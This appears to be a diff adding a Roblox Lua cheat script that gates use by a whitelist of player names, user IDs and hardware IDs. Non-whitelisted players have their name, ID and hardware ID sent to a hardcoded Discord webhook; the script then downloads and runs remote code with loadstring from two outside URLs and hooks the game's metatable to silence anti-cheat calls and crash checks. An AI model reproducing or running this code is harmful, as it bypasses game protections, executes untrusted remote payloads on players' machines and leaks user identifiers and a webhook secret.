@@ -1,1 +1,238 @@
+print("hi")
+local validUsers = {
+    "ykmeformyburns, 7122402935",
+    "shakar60, 2050503403",
+    "Claptbylax, 4596195719",
+    "myphoneisburing000, 3934561387",
+    "yomyguygye, 5015184257",
+    "pzoz853, 2474661322",
+    "IShoWKurd10, 7210993225",
+    "928x92Khalifa_H, 3645516659",
+    "gamer_judi1234, 3449894283",
+    "okayIdont09, 5658899216",
+    "0e8fl, 5184781111",
+    "dtbscrea, 3090729125",
+    "MythAngles, 7090394823",
+    "jaydenchillbad76, 3171797527",
+    "14kbran10, 2448460089",
+    "SheLuvspooks0, 5021098656",
+    "JustinSingle_PROATFN, 4358426890",
+    "WWEGamer1101, 61900767",
+    "Retlikeshimself, 5371659491",
+    "LaySmokar123, 4409344559",
+    "TSUS0K1, 7073420493",
+    "Aaron_85675, 4256434702",
+    "ghost3n7, 5251105583",
+    "HiItmehod, 2665614651",
+    "demifaith61, 6176773726",
+    "Reyes1234y, 2495450220",
+    "broyogot, 3018302851",
+    "Simonithefeo, 6004428050",
+    "colbypro1234, 1107279158",
+    "iccyv2, 4120200336",
+    "Siuanrehman, 3296269340",
+    "NoLxveGrim, 2953968097",
+    "Randy_Savage20983, 1378790653",
+    "AmJustABotv2, 3659611137",
+    "MissKeonZaren, 956966999",
+    "UnboundlessCurses, 5182649057",
+    "curseyyyt, 2847276288",
+    "pawvitaminB143, 7047441079",
+    "rannbro, 2445983048",
+    "Rudysukaturu, 3574344594",
+     "qwwkst12, 2038553126",
+     "sigma03133, 6095640660",
+      "oplhav, 3476078555",
+       "mutantrockarm, 76352784",
+        "wsp_xx00, 3405244520",
+         "BoomBySkulls, 1017526378",
+          "Adisaskrimp, 7033758123",
+          "fandemikecrasesi, 1923818882",
+           "the911atack, 4579893721",
+           "biboyboss2, 5356912890",
+           "zglocks1, 3552330616",
+           "uslz, 418151426",
+           "OriginalGhoulss, 4085754555",
+           "XxxMarcus10046xxX, 2273102449",
+           "jsjsjidkxkx, 1677551793"
+           "exhorcistosin, 4609930873"
+}
+local validHWIDs = {
+    "8a9d41b2-1a25-4e98-a4b4-0e9727dcfb38",
+    "36d67d2a-cf31-4ded-83d5-273e179cba10",
+    "ad1a202a-1e14-4413-b3f8-abed3f1da248",
+    "7396d77e-06e0-45fb-9da1-7182080569e3",
+    "a8117083-7534-4b91-9246-fadc082ff4fa",
+    "45d8ca20-cd66-4307-be9a-310da51cc8ab",
+    "1ec0a411-a51c-49b5-b622-bd12c87affce",
+    "33336914-a24c-4088-8294-edbcc95c4d4c",
+    "9861141b-02b1-45fa-8f8d-8a3eb8af5005",
+    "99e8dfe7-d0e9-40eb-bb74-e301b1786044",
+    "ceef78be-685f-417b-9640-be7a239f03b5",
+    "ef7138e3-cb93-42a3-830a-1a8c6109a445",
+    "1f1328bb-8c94-4a21-8935-73922c8c2f57",
+    "ff859c30-8985-4146-88b9-7381f2b72616",
+    "cae67b40-e493-410f-a125-a66afce1611f",
+    "369bd076-13a7-4990-9a79-9a50ad4e9157",
+    "b8589a98-3f98-47d9-afc3-dd085ef13971",
+    "0d44b624-0f6b-42a7-841b-8f7257ba0cdb",
+    "6b7f6d-e0e2-483e-be4b-0cc0113fb5bd",
+    "dfc3ef41-536f-4fec-95c8-55b42b711a22",
+    "8fc993ce-bd9e-4a4a-9210-1b6a68c0cd09",
+    "7b5a4e18-3ae3-4190-b7c6-33dce5205479",
+    "f84b1372-7908-4a6c-877a-ea66571b822b",
+    "dc6c2103-96aa-46b4-abb3-03a7b9e23fa9",
+    "2809ba53-0ba4-4c01-a4dd-6afad71c549b",
+    "c230d26d-9315-4ed4-bdf9-b9d899c96d09",
+    "60e2da7d-88cf-490d-bdc9-6cc19a8af3f4"
+}
+local blacklistedUsernames = {
+    "ungratefulAF",
+}
+function SendMessage(url, message)
+    local http = game:GetService("HttpService")
+    local headers = { ["Content-Type"] = "application/json" }
+    local data = { ["content"] = message }
+    local body = http:JSONEncode(data)
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+    print("Sent")
+end
+function SendMessageEMBED(url, embed)
+    local http = game:GetService("HttpService")
+    local headers = { ["Content-Type"] = "application/json" }
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["description"] = embed.description,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+                ["footer"] = { ["text"] = embed.footer.text }
+            }
+        }
+    }
+    local body = http:JSONEncode(data)
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+    print("Sent")
+end
+local player = game.Players.LocalPlayer
+local hwidplr = game:GetService("RbxAnalyticsService"):GetClientId()
+local function isValidUser(username, userId)
+    for _, entry in ipairs(validUsers) do
+        local validUsername, validUserId = entry:match("^(.*), (%d+)$")
+        if validUsername and validUserId then
+            if validUsername:lower() == username:lower() and tonumber(validUserId) == userId then
+                return true
+            end
+        end
+    end
+    return false
+end
+local function isValidHWID(hwid)
+    for _, validHwid in ipairs(validHWIDs) do
+        if validHwid == hwid then
+            return true
+        end
+    end
+    return false
+end
+local function isBlacklisted(username)
+    for _, v in ipairs(blacklistedUsernames) do
+        if v:lower() == username:lower() then
+            return true
+        end
+    end
+    return false
+end
+if not isValidUser(player.Name, player.UserId) and not isValidHWID(hwidplr) or isBlacklisted(player.Name) then
+    setclipboard("https://discord.gg/BndCUXbK9p")
+    local url = "https://discord.com/api/webhooks/1292066615801806920/RIfiXTIK-rAMoFZNXrHjMFfYI86v0CdKyMi8RJ2onspgwpCAOLxQ8tyJWqVzyJbVw2_V"
+    
+    SendMessage(url, "\"" .. player.Name .. "\", \"" .. player.UserId .. "\", \"" .. hwidplr .. "\"")
+    
+    local embed = {
+        ["title"] = "NotWhitelisted",
+        ["description"] = "sigma",
+        ["color"] = 65280,
+        ["fields"] = {
+            {
+                ["name"] = "User",
+    ["value"] = "\"" .. player.Name .. ", " .. player.UserId .. "\""
+            },
+            {
+                ["name"] = "HWID",
+                ["value"] = "\"" .. hwidplr .. "\""
+            }
+        },
+        ["footer"] = {
+            ["text"] = "not whitelisted"
+        }
+    }
+    
+    SendMessageEMBED(url, embed)
+    player:Kick("You are not whitelisted.")
+    wait(5)
+    game:GetService("CoreGui").HeadsetDisconnectedDialog.Enabled = true
+return
+end
+
+loadstring(game:HttpGet("https://rawscripts.net/raw/Baseplate-adonis-and-newindex-bypass-source-12378"))()
+
+local specificGameId1 = 2788229376
+local specificGameId2 = 16033173781
+local specificGameId3 = 7213786345
+
+if game.PlaceId == specificGameId1 or game.PlaceId == specificGameId2 or game.PlaceId == specificGameId3 then
+    Plr = game.Players.LocalPlayer
+
+    Bypass = true
+
+    local GameMT = getrawmetatable(game)
+    local OldIndexFunc = GameMT.__index
+    local OldNamecallFunc = GameMT.__namecall
+    setreadonly(GameMT, false)
+
+    if Bypass then
+        GameMT.__namecall = newcclosure(function(self, ...) 
+            local NamecallArgs = {...}
+            local DETECTION_STRINGS = {
+                'CHECKER_1',
+                'CHECKER',
+                'OneMoreTime',
+                'checkingSPEED',
+                'PERMAIDBAN',
+                'BANREMOTE',
+                'FORCEFIELD',
+                'TeleportDetect',
+            }
+
+            if table.find(DETECTION_STRINGS, NamecallArgs[1]) and getnamecallmethod() == 'FireServer' then 
+                return
+            end
+
+            local suc, err = pcall(getfenv, 2)
+            if not err then 
+                if getfenv(2).crash then 
+                    hookfunction(getfenv(2).crash, function() end)
+                end
+            end
+
+            return OldNamecallFunc(self, ...)
+        end)
+    end
+end
+
+wait(2)
+
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/maiy1993/SigmaOhioKing30000000000000000000000/refs/heads/main/Protected_6080031145304449.txt",true))()
